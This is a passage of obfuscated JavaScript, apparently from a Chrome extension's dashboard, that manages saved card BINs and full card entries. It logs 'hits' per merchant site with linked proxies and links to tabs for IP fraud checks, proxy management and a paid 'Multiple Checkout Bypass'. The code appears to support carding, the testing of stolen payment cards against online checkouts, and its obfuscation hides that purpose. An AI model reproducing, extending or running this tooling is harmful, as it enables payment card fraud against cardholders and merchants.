          _0x333cc9("Endpoint saved successfully!", "success");
          _0x4edc0a(true, true);
        });
      });
    }
    var _0x8dcace = _0x1d3308("binLibCount");
    var _0x651ff4 = _0x1d3308("myBinInput");
    var _0x42d077 = _0x1d3308("myBinAddBtn");
    var _0x5757d0 = _0x1d3308("myBinStatus");
    var _0x3ef11f = _0x1d3308("myBinList");
    var _0x4c8c00 = [];
    var _0x35d65e = [];
    var _0x415c30 = {};
    var _0x47f13d = {};
    if (_0x42d077) {
      _0x42d077.addEventListener("click", _0x2e82e8);
    }
    if (_0x651ff4) {
      _0x651ff4.addEventListener("keypress", function (_0xfc20bb) {
        if (_0xfc20bb.key === "Enter") {
          _0x2e82e8();
        }
      });
    }
    if (_0x5ca2bc) {
      _0x5ca2bc.addEventListener("click", _0x18de94);
    }
    function _0x18de94() {
      var _0x1f9daa = _0x4c75e3 ? _0x4c75e3.textContent.trim() : "";
      if (!_0x1f9daa || _0x1f9daa === "----") {
        _0x333cc9("Top BIN is not available yet.", "error");
        return;
      }
      _0x3db187(_0x1f9daa, _0x5ca2bc);
    }
    function _0x388f9a() {
      if (!_0x5757d0 || !_0x3ef11f) {
        return;
      }
      _0x5757d0.textContent = "Loading your BINs...";
      _0x3ef11f.innerHTML = "<div class=\"loading\"><div class=\"spinner\"></div><div style=\"font-size: 12px; color: var(--text-muted);\">Loading your BINs…</div></div>";
      _0x8dcace.textContent = "--";
    }
    function _0x36af0d() {
      if (!_0x5757d0 || !_0x3ef11f) {
        return;
      }
      _0x388f9a();
      if (!_0xc81f0) {
        _0x5757d0.textContent = "You must be logged in to save BINs.";
        _0x3ef11f.innerHTML = "<div class=\"binlib-empty\">Login required</div>";
        _0x8dcace.textContent = "0";
        return;
      }
      var _0xcfcd13 = _0x59e7fa("get-user-bins", {
        token: _0xc81f0
      });
      var _0x47676b = userRole === "owner" ? _0x59e7fa("get-user-bins", {
        token: _0xc81f0,
        owner_all: true
      }) : Promise.resolve(null);
      Promise.all([_0xcfcd13, _0x47676b]).then(function (_0x1ad808) {
        var _0x4fd25d = _0x1ad808[0] || {};
        var _0x5570c5 = _0x1ad808[1] || null;
        var _0x275289 = _0x4fd25d.success && Array.isArray(_0x4fd25d.saved_bins) ? Array.from(new Set(_0x4fd25d.saved_bins.map(_0xeb68dc).filter(Boolean))) : [];
        var _0x1a4ddf = [];
        if (userRole === "owner" && _0x5570c5 && _0x5570c5.success && Array.isArray(_0x5570c5.saved_bins)) {
          _0x1a4ddf = Array.from(new Set(_0x5570c5.saved_bins.map(_0xeb68dc).filter(Boolean)));
        }
        _0x35d65e = _0x275289.slice();
        _0x415c30 = {};
        _0x35d65e.forEach(function (_0x203c03) {
          var _0x4970e9 = _0x56a8b5(_0x203c03);
          if (_0x4970e9) {
            _0x415c30[_0x4970e9] = true;
          }
        });
        _0x47f13d = _0x4fd25d.success && _0x4fd25d.bin_metadata && typeof _0x4fd25d.bin_metadata === "object" ? _0x4fd25d.bin_metadata : {};
        if (userRole === "owner") {
          var _0x404da3 = _0x275289.slice();
          _0x1a4ddf.forEach(function (_0x2114c9) {
            if (_0x404da3.indexOf(_0x2114c9) === -1) {
              _0x404da3.push(_0x2114c9);
            }
          });
          _0x4c8c00 = _0x404da3;
        } else {
          _0x4c8c00 = _0x275289;
        }
        chrome.storage.local.set({
          tyagrey_saved_bins: _0x35d65e
        });
        chrome.storage.local.get(["tyagrey_current_bin", "tyagrey_my_hits_cache", "tya_local_history", "tyagrey_pending_hits"], function (_0x194eb5) {
          _0x38662b(_0x194eb5.tyagrey_current_bin || "", _0x194eb5);
        });
      }).catch(function (_0x47393f) {
        _0x4c8c00 = [];
        _0x35d65e = [];
        _0x415c30 = {};
        _0x47f13d = {};
        _0x5757d0.textContent = "Unable to load saved BINs: " + (_0x47393f && _0x47393f.message ? _0x47393f.message : "Unknown error");
        _0x3ef11f.innerHTML = "<div class=\"binlib-empty\">Unable to load BINs.</div>";
        _0x8dcace.textContent = "0";
      });
    }
    function _0xeb68dc(_0x54cc49) {
      if (typeof _0x54cc49 !== "string") {
        return "";
      }
      var _0x3f4e08 = _0x54cc49.trim().replace(/\s+/g, "").toUpperCase();
      return _0x3f4e08;
    }
    function _0x56a8b5(_0x217bb5) {
      if (typeof _0x217bb5 !== "string") {
        return "";
      }
      var _0xf4787e = _0x217bb5.split(/[:|]/)[0] || _0x217bb5;
      _0xf4787e = _0xf4787e.replace(/\D/g, "");
      return _0xf4787e.substring(0, 6);
    }
    function _0x5d8de6(_0x3baeaf) {
      if (typeof _0x3baeaf !== "string") {
        return "BIN";
      }
      if (_0x3baeaf.indexOf(":") !== -1) {
        return "BIN:CC";
      }
      if (_0x3baeaf.indexOf("|") !== -1) {
        return "Full Card";
      }
      return "BIN";
    }
    function _0x420f98(_0x1a8cba) {
      var _0xd4f9ee = [];
      if (_0x1a8cba) {
        if (Array.isArray(_0x1a8cba.tyagrey_my_hits_cache)) {
          _0xd4f9ee = _0xd4f9ee.concat(_0x1a8cba.tyagrey_my_hits_cache);
        }
        if (Array.isArray(_0x1a8cba.tya_local_history)) {
          _0xd4f9ee = _0xd4f9ee.concat(_0x1a8cba.tya_local_history);
        }
        if (Array.isArray(_0x1a8cba.tyagrey_pending_hits)) {
          _0xd4f9ee = _0xd4f9ee.concat(_0x1a8cba.tyagrey_pending_hits);
        }
      }
      var _0x334995 = {};
      _0xd4f9ee.forEach(function (_0x4fd496) {
        if (!_0x4fd496 || typeof _0x4fd496 !== "object") {
          return;
        }
        var _0x2ccef8 = _0x4fd496.card_info || _0x4fd496.card || _0x4fd496.cc || "";
        var _0x1dc78b = _0x56a8b5(_0x2ccef8);
        if (!_0x1dc78b) {
          return;
        }
        var _0x2b220b = new Date(_0x4fd496.created_at || _0x4fd496.time || _0x4fd496.timestamp || 0).getTime();
        if (!_0x334995[_0x1dc78b] || _0x2b220b > _0x334995[_0x1dc78b].ts) {
          _0x334995[_0x1dc78b] = {
            lastSite: _0x4fd496.site || _0x4fd496.merchant || _0x4fd496.site_name || "N/A",
            lastHit: _0x4fd496.created_at || _0x4fd496.time || _0x4fd496.timestamp || "",
            ts: _0x2b220b
          };
        }
      });
      return _0x334995;
    }
    function _0x2ab935(_0x47a68e, _0x1bb843) {
      if (_0x47f13d && _0x47f13d[_0x47a68e]) {
        var _0x49c371 = _0x47f13d[_0x47a68e];
        return {
          lastSite: _0x49c371.last_site || _0x49c371.lastSite || null,
          lastHit: _0x49c371.last_hit || _0x49c371.lastHit || null,
          proxy: _0x49c371.proxy || null
        };
      }
      if (_0x1bb843 && _0x1bb843[_0x47a68e]) {
        return _0x1bb843[_0x47a68e];
      } else {
        return null;
      }
    }
    function _0x38662b(_0x1ef76d, _0x1004ea) {
      _0x8dcace.textContent = String(_0x4c8c00.length);
      var _0x152f66 = _0x420f98(_0x1004ea || {});
      var _0x5327a5 = _0x56a8b5(_0x1ef76d || "");
      var _0x5536bf = _0x22b33b && _0x5c3c7f && _0x5c3c7f.textContent ? _0x5c3c7f.textContent : "None";
      var _0x16c47c = _0x1ef76d && _0x4c8c00.some(function (_0x37d923) {
        return _0x56a8b5(_0x37d923) === _0x5327a5;
      });
      if (_0x4c8c00.length === 0 && !_0x1ef76d) {
        _0x5757d0.textContent = "No saved BINs yet. Add one to store it in cloud.";
        _0x3ef11f.innerHTML = "<div class=\"binlib-empty\">No saved BINs yet.</div>";
        return;
      }
      _0x5757d0.textContent = "You can Use / Edit / Delete any BIN from your personal list.";
      var _0x30c00e = "";
      if (_0x1ef76d && !_0x16c47c) {
        var _0x592333 = _0x56a8b5(_0x1ef76d);
        var _0x4c299a = _0x2ab935(_0x592333, _0x152f66);
        var _0x5ecd2f = _0x4c299a && _0x4c299a.proxy ? _0x4c299a.proxy : _0x5536bf;
        _0x30c00e += "<div class=\"my-bin-card\"><div class=\"my-bin-card-header\"><div><div class=\"my-bin-card-label\">BIN</div><div class=\"my-bin-card-text\">" + _0x3b7b71(_0x1ef76d) + "</div></div></div><div class=\"my-bin-card-grid\"><div class=\"my-bin-card-meta\">Linked Proxy</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x5ecd2f) + "</div><div class=\"my-bin-card-meta\">Extra</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x5d8de6(_0x1ef76d)) + "</div><div class=\"my-bin-card-meta\">Last Site</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x4c299a && _0x4c299a.lastSite ? _0x4c299a.lastSite : "No Hit Detected") + "</div><div class=\"my-bin-card-meta\">Last Hit</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x4c299a && _0x4c299a.lastHit ? _0x3f5946(_0x4c299a.lastHit) : "No Hit Detected") + "</div></div></div>";
      }
      _0x4c8c00.forEach(function (_0x5abd95, _0x508eb2) {
        var _0x2531bf = _0x5327a5 && _0x56a8b5(_0x5abd95) === _0x5327a5;
        var _0x38e9d0 = !!_0x415c30[_0x56a8b5(_0x5abd95)];
        var _0x5a7d06 = _0x2531bf ? "BIN" : _0x38e9d0 ? "My BIN" : userRole === "owner" ? "User BIN" : "Quick BIN";
        var _0xb80559 = _0x56a8b5(_0x5abd95);
        var _0x4aa94e = _0x2ab935(_0xb80559, _0x152f66);
        var _0x96de4e = _0x4aa94e && _0x4aa94e.proxy ? _0x4aa94e.proxy : _0x5536bf;
        _0x30c00e += "<div class=\"my-bin-card\"><div class=\"my-bin-card-header\"><div><div class=\"my-bin-card-label\">" + _0x3b7b71(_0x5a7d06) + "</div><div class=\"my-bin-card-text\">" + _0x3b7b71(_0x5abd95) + "</div></div>";
        var _0x1d0a71 = _0x2531bf ? "disabled" : "";
        var _0x56b57f = userRole === "owner" && !_0x38e9d0 ? "disabled" : "";
        _0x30c00e += "<div class=\"my-bin-actions\"><button type=\"button\" class=\"my-bin-use-btn\" data-index=\"" + _0x508eb2 + "\" " + _0x1d0a71 + ">Use</button><button type=\"button\" class=\"my-bin-edit-btn\" data-index=\"" + _0x508eb2 + "\" " + _0x56b57f + ">Edit</button><button type=\"button\" class=\"my-bin-delete-btn\" data-index=\"" + _0x508eb2 + "\">Delete</button></div>";
        _0x30c00e += "</div><div class=\"my-bin-card-grid\"><div class=\"my-bin-card-meta\">Linked Proxy</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x96de4e) + "</div><div class=\"my-bin-card-meta\">Extra</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x5d8de6(_0x5abd95)) + "</div><div class=\"my-bin-card-meta\">Last Site</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x4aa94e && _0x4aa94e.lastSite ? _0x4aa94e.lastSite : "No Hit Detected") + "</div><div class=\"my-bin-card-meta\">Last Hit</div><div class=\"my-bin-card-meta-value\">" + _0x3b7b71(_0x4aa94e && _0x4aa94e.lastHit ? _0x3f5946(_0x4aa94e.lastHit) : "No Hit Detected") + "</div></div></div>";
      });
      _0x3ef11f.innerHTML = _0x30c00e;
      var _0xb89c26 = _0x3ef11f.querySelectorAll(".my-bin-use-btn");
      _0xb89c26.forEach(function (_0x2ccfee) {
        _0x2ccfee.addEventListener("click", function () {
          var _0x233d76 = parseInt(_0x2ccfee.getAttribute("data-index"), 10);
          if (!isNaN(_0x233d76)) {
            _0x32c58a(_0x233d76);
          }
        });
      });
      var _0x2cb8ec = _0x3ef11f.querySelectorAll(".my-bin-edit-btn");
      _0x2cb8ec.forEach(function (_0x22bb3b) {
        _0x22bb3b.addEventListener("click", function () {
          var _0x114757 = parseInt(_0x22bb3b.getAttribute("data-index"), 10);
          if (!isNaN(_0x114757)) {
            _0x592e5c(_0x114757);
          }
        });
      });
      var _0x321586 = _0x3ef11f.querySelectorAll(".my-bin-delete-btn");
      _0x321586.forEach(function (_0x575ad6) {
        _0x575ad6.addEventListener("click", function () {
          var _0x2c0111 = parseInt(_0x575ad6.getAttribute("data-index"), 10);
          if (!isNaN(_0x2c0111)) {
            _0x3b04af(_0x2c0111);
          }
        });
      });
    }
    function _0x32c58a(_0x490e33) {
      if (_0x490e33 < 0 || _0x490e33 >= _0x4c8c00.length) {
        return;
      }
      var _0x2c6f4b = _0x4c8c00[_0x490e33];
      if (!_0x2c6f4b) {
        return;
      }
      chrome.storage.local.set({
        tyagrey_current_bin: _0x2c6f4b,
        tyagrey_panel_quick_bins: [_0x2c6f4b]
      }, function () {
        chrome.storage.local.get(["tyagrey_current_bin", "tyagrey_my_hits_cache", "tya_local_history", "tyagrey_pending_hits"], function (_0x22e0e3) {
          _0x38662b(_0x2c6f4b, _0x22e0e3);
          _0x5757d0.textContent = "Active BIN overridden to " + _0x2c6f4b + ".";
        });
      });
    }
    function _0x592e5c(_0x44373d) {
      if (_0x44373d < 0 || _0x44373d >= _0x4c8c00.length) {
        return;
      }
      var _0x122643 = _0x4c8c00[_0x44373d];
      if (userRole === "owner" && !_0x415c30[_0x56a8b5(_0x122643)]) {
        _0x5757d0.textContent = "Owner can only edit BINs from their personal list.";
        return;
      }
      var _0x23771f = prompt("Edit BIN", _0x122643);
      if (_0x23771f === null) {
        return;
      }
      var _0x504e42 = _0xeb68dc(_0x23771f);
      if (!_0x504e42) {
        _0x5757d0.textContent = "Enter a valid BIN to update.";
        return;
      }
      if (_0x504e42 === _0x122643) {
        return;
      }
      if (_0x35d65e.some(function (_0x3b5501, _0x2207e4) {
        return _0xeb68dc(_0x3b5501) === _0x504e42 && _0xeb68dc(_0x3b5501) !== _0xeb68dc(_0x122643);
      })) {
        _0x5757d0.textContent = "This BIN already exists in your list.";
        return;
      }
      var _0x5d0afb = _0x35d65e.slice();
      var _0x36e15f = _0x5d0afb.indexOf(_0x122643);
      if (_0x36e15f < 0) {
        _0x36e15f = _0x44373d;
      }
      _0x5d0afb[_0x36e15f] = _0x504e42;
      var _0x32a151 = _0x56a8b5(_0x122643);
      var _0xdcb67c = _0x56a8b5(_0x504e42);
      if (_0x32a151 && _0xdcb67c && _0x32a151 !== _0xdcb67c && _0x47f13d[_0x32a151]) {
        _0x47f13d[_0xdcb67c] = _0x47f13d[_0x32a151];
        delete _0x47f13d[_0x32a151];
      }
      chrome.storage.local.get(["tyagrey_current_bin"], function (_0x3fa7c9) {
        if (_0x56a8b5(_0x3fa7c9.tyagrey_current_bin || "") === _0x56a8b5(_0x122643)) {
          chrome.storage.local.set({
            tyagrey_current_bin: _0x504e42
          });
        }
        _0x3aeaf5(_0x5d0afb, "BIN updated successfully.");
      });
    }
    function _0x2e82e8() {
      var _0xdd20d7 = _0xeb68dc(_0x651ff4.value || "");
      if (!_0xdd20d7) {
        _0x5757d0.textContent = "Enter a valid BIN.";
        return;
      }
      if (_0x35d65e.includes(_0xdd20d7)) {
        _0x5757d0.textContent = "This BIN is already saved.";
        _0x651ff4.value = "";
        return;
      }
      var _0x28e263 = [_0xdd20d7].concat(_0x35d65e);
      _0x28e263 = Array.from(new Set(_0x28e263.map(_0xeb68dc).filter(Boolean)));
      var _0x5b6350 = _0x56a8b5(_0xdd20d7);
      if (_0x5b6350) {
        _0x47f13d[_0x5b6350] = {
          proxy: _0x22b33b && _0x5c3c7f && _0x5c3c7f.textContent ? _0x5c3c7f.textContent : "None",
          last_site: null,
          last_hit: null
        };
      }
      _0x3aeaf5(_0x28e263, "BIN added successfully.");
    }
    function _0x42cb9e() {
      if (!_0xc81f0) {
        _0x5757d0.textContent = "You must be logged in to clear BINs.";
        return;
      }
      if (!confirm("Clear all saved BINs from cloud and local cache? This cannot be undone.")) {
        return;
      }
      _0x5757d0.textContent = "Clearing your saved BINs...";
      if (myBinClearBtn) {
        myBinClearBtn.disabled = true;
      }
      _0x59e7fa("clear-user-bins", {
        token: _0xc81f0
      }).then(function (_0x5a36db) {
        if (myBinClearBtn) {
          myBinClearBtn.disabled = false;
        }
        if (_0x5a36db && _0x5a36db.success) {
          chrome.storage.local.remove(["tyagrey_saved_bins", "tyagrey_panel_quick_bins"], function () {
            _0x35d65e = [];
            _0x4c8c00 = [];
            _0x47f13d = {};
            _0x5757d0.textContent = "All saved BINs have been cleared.";
            _0x36af0d();
          });
        } else {
          _0x5757d0.textContent = "Clear failed: " + (_0x5a36db && (_0x5a36db.message || _0x5a36db.error) ? _0x5a36db.message || _0x5a36db.error : "Unknown error");
        }
      }).catch(function (_0x2dd204) {
        if (myBinClearBtn) {
          myBinClearBtn.disabled = false;
        }
        _0x5757d0.textContent = "Clear failed: " + (_0x2dd204 && _0x2dd204.message ? _0x2dd204.message : "Unknown error");
      });
    }
    function _0x3b04af(_0x5af346) {
      if (_0x5af346 < 0 || _0x5af346 >= _0x4c8c00.length) {
        return;
      }
      var _0x25e226 = _0x4c8c00[_0x5af346];
      if (!_0x25e226) {
        return;
      }
      if (userRole === "owner") {
        _0x5757d0.textContent = "Deleting BIN from database...";
        _0x59e7fa("owner-delete-bin", {
          token: _0xc81f0,
          bin: _0x25e226
        }).then(function (_0x4d621c) {
          if (_0x4d621c && _0x4d621c.success) {
            chrome.storage.local.get(["tyagrey_current_bin"], function (_0x15006b) {
              var _0x26db22 = _0x15006b.tyagrey_current_bin || "";
              if (_0x56a8b5(_0x26db22) && _0x56a8b5(_0x26db22) === _0x56a8b5(_0x25e226)) {
                chrome.storage.local.set({
                  tyagrey_current_bin: "",
                  tyagrey_panel_quick_bins: []
                });
              }
              _0x5757d0.textContent = "BIN deleted from database.";
              _0x36af0d();
            });
          } else {
            _0x5757d0.textContent = "Delete failed: " + (_0x4d621c && (_0x4d621c.message || _0x4d621c.error) ? _0x4d621c.message || _0x4d621c.error : "Unknown error");
          }
        });
        return;
      }
      var _0xde0001 = _0x35d65e.slice();
      var _0x24c91f = [];
      for (var _0x56cdfd = 0; _0x56cdfd < _0xde0001.length; _0x56cdfd++) {
        if (_0xeb68dc(_0xde0001[_0x56cdfd]) !== _0xeb68dc(_0x25e226)) {
          _0x24c91f.push(_0xde0001[_0x56cdfd]);
        }
      }
      _0x3aeaf5(_0x24c91f, "BIN removed successfully.");
    }
    function _0x3aeaf5(_0x16f8ef, _0x505ee2) {
      if (!_0xc81f0) {
        _0x5757d0.textContent = "You must be logged in to save BINs.";
        return;
      }
      _0x5757d0.textContent = "Saving BINs...";
      _0x59e7fa("save-user-bins", {
        token: _0xc81f0,
        saved_bins: _0x16f8ef,
        bin_metadata: _0x47f13d
      }).then(function (_0x5e9925) {
        if (_0x5e9925.success) {
          _0x35d65e = _0x16f8ef;
          if (_0x5e9925.bin_metadata && typeof _0x5e9925.bin_metadata === "object") {
            _0x47f13d = _0x5e9925.bin_metadata;
          }
          chrome.storage.local.set({
            tyagrey_panel_quick_bins: _0x16f8ef.slice()
          });
          chrome.storage.local.remove(["tyagrey_saved_bins"], function () {
            chrome.storage.local.get(["tyagrey_current_bin", "tyagrey_my_hits_cache", "tya_local_history", "tyagrey_pending_hits"], function (_0x2e86bb) {
              _0x38662b(_0x2e86bb.tyagrey_current_bin || "", _0x2e86bb);
              _0x651ff4.value = "";
              _0x5757d0.textContent = _0x505ee2 || "Saved successfully to cloud.";
              _0x36af0d();
            });
          });
        } else {
          _0x5757d0.textContent = "Save failed: " + (_0x5e9925.message || _0x5e9925.error || "Unknown error");
        }
      });
    }
    function _0x9972d2() {
      var _0x1ad7ce = binLibData.slice();
      if (binLibFilter === "top") {
        _0x1ad7ce.sort(function (_0x17fd9f, _0x28401f) {
          return (_0x28401f.likes || 0) - (_0x17fd9f.likes || 0);
        });
      } else {
        _0x1ad7ce.sort(function (_0x1060be, _0x18b439) {
          var _0x2e7bdd = _0x1060be.added_at ? new Date(_0x1060be.added_at).getTime() : 0;
          var _0x3df438 = _0x18b439.added_at ? new Date(_0x18b439.added_at).getTime() : 0;
          return _0x3df438 - _0x2e7bdd;
        });
      }
      var _0xd57f3c = "";
      _0x1ad7ce.forEach(function (_0xa48e83, _0x380557) {
        var _0x4554b7 = "--";
        if (_0xa48e83.added_at) {
          var _0x5db999 = new Date(_0xa48e83.added_at);
          if (!isNaN(_0x5db999)) {
            var _0x12359f = String(_0x5db999.getDate()).padStart(2, "0");
            var _0x251587 = String(_0x5db999.getMonth() + 1).padStart(2, "0");
            var _0x1e5dd7 = String(_0x5db999.getFullYear()).slice(-2);
            var _0x4a4f22 = _0x5db999.getHours();
            var _0x5d1ffe = _0x4a4f22 >= 12 ? "pm" : "am";
            _0x4a4f22 = _0x4a4f22 % 12 || 12;
            var _0x5438db = String(_0x5db999.getMinutes()).padStart(2, "0");
            _0x4554b7 = _0x12359f + "|" + _0x251587 + "|" + _0x1e5dd7 + " " + _0x4a4f22 + ":" + _0x5438db + _0x5d1ffe;
          }
        }
        var _0x37eed6 = _0xa48e83.credit || "N/A";
        if (_0x37eed6.charAt(0) === "@") {
          _0x37eed6 = _0x37eed6.substring(1);
        }
        var _0x60ff27 = _0xa48e83.likes || 0;
        var _0x52dbe8 = _0xa48e83.dislikes || 0;
        _0xd57f3c += "<div class=\"binlib-card\"><div class=\"binlib-row\"><span class=\"binlib-lbl\">Site:</span><span class=\"binlib-val\">" + _0x3b7b71(_0xa48e83.site || "N/A") + "</span></div><div class=\"binlib-row\"><span class=\"binlib-lbl\">Bin:</span><span class=\"binlib-val binlib-val--bin\">" + _0x3b7b71(_0xa48e83.bin || "N/A") + "</span></div><div class=\"binlib-row\"><span class=\"binlib-lbl\">C/r:</span><span class=\"binlib-val binlib-val--credit\">@" + _0x3b7b71(_0x37eed6) + "</span></div><hr class=\"binlib-sep\"><div class=\"binlib-foot\"><span class=\"binlib-foot-date\">Uploaded on: " + _0x3b7b71(_0x4554b7) + "</span><span class=\"binlib-foot-counts\"><span class=\"binlib-fc-like\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z\"/><path d=\"M7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3\"/></svg>" + _0x60ff27 + "</span><span class=\"binlib-fc-sep\">|</span><span class=\"binlib-fc-dislike\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3H10z\"/><path d=\"M17 2h2.67A2.31 2.31 0 0 1 22 4v7a2.31 2.31 0 0 1-2.33 2H17\"/></svg>" + _0x52dbe8 + "</span></span></div></div>";
      });
      binLibBody.innerHTML = _0xd57f3c;
    }
    var _0x25bd9e = _0x1d3308("dashPfp");
    var _0x9f9024 = _0x1d3308("dashPfpFallback");
    var _0x491cbd = _0x1d3308("dashName");
    var _0x5872be = _0x1d3308("dashUsername");
    var _0xbb52af = _0x1d3308("dashId");
    console.log("Dashboard DOM elements:", {
      dashUsername: _0x5872be,
      dashId: _0xbb52af,
      dashName: _0x491cbd
    });
    var _0x5d57eb = _0x1d3308("dashHits");
    var _0x26dad2 = _0x1d3308("dashDaily");
    var _0x2e5b51 = _0x1d3308("dashGlobal");
    var _0x291ef5 = _0x1d3308("chipLicenseDot");
    var _0x1623b5 = _0x1d3308("chipLicense");
    var _0x5b8884 = _0x1d3308("chipProxyDot");
    var _0x1f05db = _0x1d3308("chipProxy");
    var _0x3ed34f = _0x1d3308("chipVersion");
    var _0x3c2a48 = _0x1d3308("versionBadge");
    var _0x347659 = _0x1d3308("dashAttempts");
    var _0x469450 = _0x1d3308("dashRate");
    var _0xf09f8d = _0x1d3308("statUsers");
    var _0x5b0ff5 = _0x1d3308("statHits");
    var _0x55d3f6 = _0x1d3308("statToday");
    var _0x51db00 = _0x1d3308("statWeek");
    var _0x3c4822 = _0x1d3308("leaderboardList");
    var _0x55c5f6 = _0x1d3308("proxyIcon");
    var _0x181b8c = _0x1d3308("proxyStatusText");
    var _0x5c3c7f = _0x1d3308("proxyHostDisplay");
    var _0x16e1c9 = _0x1d3308("proxyMode");
    var _0x3172d7 = _0x1d3308("proxyPort");
    var _0x926100 = _0x1d3308("clearProxyBtn");
    var _0x31894a = _0x1d3308("logoutBtn");
    var _0x3edd54 = _0x1d3308("headerLogoutBtn");
    var _0xc81f0 = "";
    var _0x42475b = "";
    var _0x4a801b = false;
    var _0x36f16d = false;
    var _0x5b9a10 = false;
    var _0x22b33b = false;
    var _0x4bba41 = "dashboard";
    document.querySelectorAll(".tab-btn").forEach(_0x20c72f => {
      _0x20c72f.addEventListener("click", () => {
        const _0x46ba75 = _0x20c72f.dataset.tab;
        if (!_0x46ba75) {
          return;
        }
        if (userRole === "user") {
          if (_0x46ba75 === "binlookup") {
            _0x333cc9("Database Statistics are available. Upgrade to Pro for full BIN Lookup access.", "info");
          }
          if (_0x46ba75 === "custom-checkout") {
            _0x333cc9("Multiple Checkout Bypass is a Pro feature. Upgrade to Pro to use it.", "error");
          }
        }
        document.querySelectorAll(".tab-btn").forEach(_0x5c5493 => _0x5c5493.classList.remove("active"));
        document.querySelectorAll(".tab-panel").forEach(_0x45046b => _0x45046b.classList.remove("active"));
        _0x20c72f.classList.add("active");
        const _0x373e9e = document.getElementById("panel-" + _0x46ba75);
        if (_0x373e9e) {
          _0x373e9e.classList.add("active");
        }
        _0x4bba41 = _0x46ba75;
        if (_0x46ba75 === "ownerpanel") {
          _0x5c5877();
        }
        if (_0x46ba75 === "binlookup") {
          loadBinLookup();
        }
        if (_0x46ba75 === "myhits" && !_0x36f16d) {
          _0x5a406a();
        }
        if (_0x46ba75 === "mybins") {
          _0x36af0d();
        }
        if (_0x46ba75 === "iplist") {
          _0x1e3402();
        }
        if (_0x46ba75 === "ipfraud") {
          _0x4edc0a(true, true);
          if (_0x2c6318) {
            _0x2c6318.classList.add("loading");
            setTimeout(() => {
              _0x2c6318.classList.remove("loading");
            }, 1000);
          }
        }
        if (_0x46ba75 === "ownerpanel") {
          _0x5c5877();
        }
        if (_0x46ba75 === "dashboard") {
          _0x115320();
        }
        if (_0x46ba75 === "proxymanager") {
          _0x47d8cf();
          _0x1446c0();
        }
        if (_0x46ba75 === "statistics" && !_0x4a801b) {
          _0x190705();
        }
        if (_0x46ba75 === "custom-checkout") {
          if (window.CustomCheckoutBypasser) {
            window.CustomCheckoutBypasser.loadSettings();
          }
        }
      });
    });
    if (_0x31894a) {
      _0x31894a.addEventListener("click", function () {
        chrome.storage.local.remove(["tyagrey_token", "tyagrey_user_id", "tyagrey_chat_id", "tyagrey_first_name", "tyagrey_telegram", "tyagrey_role", "tya_local_hits", "tya_local_attempts", "tyagrey_my_hits_cache", "tya_local_history", "tyagrey_pending_hits", "tyagrey_uploaded_hit_keys", "tyagrey_saved_bins", "tyagrey_current_bin", "tyagrey_card_history", "tyagrey_last_notification_sync", "tya_fx_rates_usd", "tya_fx_rates_ts", "tyagrey_ipfraud_count", "tyagrey_ipfraud_date"], function () {
          chrome.tabs.query({
            active: true,
            currentWindow: true
          }, function (_0x4cd93f) {
            if (_0x4cd93f[0]) {
              chrome.tabs.remove(_0x4cd93f[0].id, function () {
                chrome.tabs.create({
                  url: chrome.runtime.getURL("design/login.html")
                });
              });
            }
          });
        });
      });
    }
    if (_0x3edd54) {
      _0x3edd54.addEventListener("click", function () {
        if (_0x31894a) {
          _0x31894a.click();
        } else {
          chrome.storage.local.remove(["tyagrey_token", "tyagrey_user_id", "tyagrey_chat_id", "tyagrey_first_name", "tyagrey_telegram", "tyagrey_role", "tya_local_hits", "tya_local_attempts", "tyagrey_my_hits_cache", "tya_local_history", "tyagrey_pending_hits", "tyagrey_uploaded_hit_keys", "tyagrey_saved_bins", "tyagrey_current_bin", "tyagrey_card_history", "tyagrey_last_notification_sync", "tya_fx_rates_usd", "tya_fx_rates_ts", "tyagrey_ipfraud_count", "tyagrey_ipfraud_date"], function () {
            chrome.tabs.query({
              active: true,
              currentWindow: true
            }, function (_0x5ec81c) {
              if (_0x5ec81c[0]) {
                chrome.tabs.remove(_0x5ec81c[0].id, function () {
                  chrome.tabs.create({
                    url: chrome.runtime.getURL("design/login.html")
                  });
                });
              }
            });
          });
        }
      });
    }
    function _0x59e7fa(_0x329fa5, _0x4081f4) {
      _0x4081f4 = _0x4081f4 || {};
      return new Promise(function (_0x551de5) {
        try {
          if (_0x329fa5 === "get-user-data" || _0x329fa5 === "popup-stats" || _0x329fa5 === "leaderboard") {
            _0x4081f4._method = "GET";
          }
          chrome.runtime.sendMessage({
            type: "API_REQUEST",
            endpoint: _0x329fa5,
            payload: _0x4081f4
          }, function (_0x1e2080) {
            if (chrome.runtime.lastError) {
              _0x551de5({
                success: false,
                error: chrome.runtime.lastError.message || "Runtime error"
              });
              return;
            }
            _0x551de5(_0x1e2080 || {
              success: false,
              error: "No response"
            });
          });
        } catch (_0x40b40c) {
          _0x551de5({
            success: false,
            error: _0x40b40c && _0x40b40c.message ? _0x40b40c.message : "Request failed"
          });
        }
      });
    }
    function _0x892fbd(_0x106c06, _0x26a30c) {
      _0x106c06 = _0x106c06 || {};
      _0x26a30c = _0x26a30c || {};
      var _0x12065a = (_0x106c06.username || _0x106c06.telegram_username || _0x106c06.telegram || "").trim();
      if (!_0x12065a) {
        _0x12065a = (_0x26a30c.tyagrey_telegram || "").trim();
      }
      if (!_0x12065a) {
        _0x12065a = (_0x106c06.first_name || _0x26a30c.tyagrey_first_name || "").trim();
      }
      var _0xcad2e4 = String(_0x106c06.chat_id || _0x106c06.user_id || _0x26a30c.tyagrey_chat_id || _0x26a30c.tyagrey_user_id || "").trim();
      var _0xf8d4e8 = document.getElementById("dashUsername");
